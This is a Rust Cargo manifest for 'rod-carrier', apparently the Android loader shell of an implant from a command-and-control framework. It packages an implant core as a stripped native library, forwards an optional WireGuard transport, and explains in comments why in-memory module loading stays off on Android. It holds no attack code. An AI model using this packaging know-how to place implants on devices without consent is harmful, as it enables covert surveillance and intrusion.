[package]
name = "rod-carrier"
version = "1.0.0-dev"
edition = "2021"

# The Android carrier shell (architecture.md Sec 12.2, the mobile reach
# leg): the cdylib android.app.NativeActivity loads when the APK's
# manifest names it. The whole implant core arrives as the parent crate's
# library, so the shell is entry plumbing, not protocol. The build unit
# compiles this crate for -linux-android triples and packages the result
# with the SDK's aapt2/apksigner against AndroidManifest.xml beside this
# file. The module family stays dormant on this leg (plugins.rs): bionic
# below API 30 carries no memfd_create to link and the app SELinux domain
# denies exec of anonymous fds, so the seam refuses rather than failing
# at load time.
#
# An external component like the implant crate beside it: not part of
# Rod.slnx. The Rust build unit compiles it per android build request,
# against the bake the parent crate carries.

[lib]
name = "rod_carrier"
crate-type = ["cdylib"]

[dependencies]
rod-implant = { path = ".." }

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true

[features]
# The implant core's optional WireGuard transport, forwarded so an android
# build against a wireguard listener compiles the tunnel carriage into the
# cdylib the build unit enables it on.
wireguard = ["rod-implant/wireguard"]
